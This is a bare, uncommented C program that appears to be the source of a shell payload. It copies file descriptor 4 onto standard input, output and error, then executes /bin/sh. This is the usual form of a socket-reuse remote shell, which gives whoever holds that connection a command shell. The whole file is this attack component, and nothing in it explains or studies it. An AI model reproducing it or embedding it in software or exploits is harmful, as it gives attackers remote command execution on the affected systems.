int
main(void)
{
	
	dup2(4,0);
	dup2(4,1);
	dup2(4,2);
	execve("/bin/sh",0,0);
}
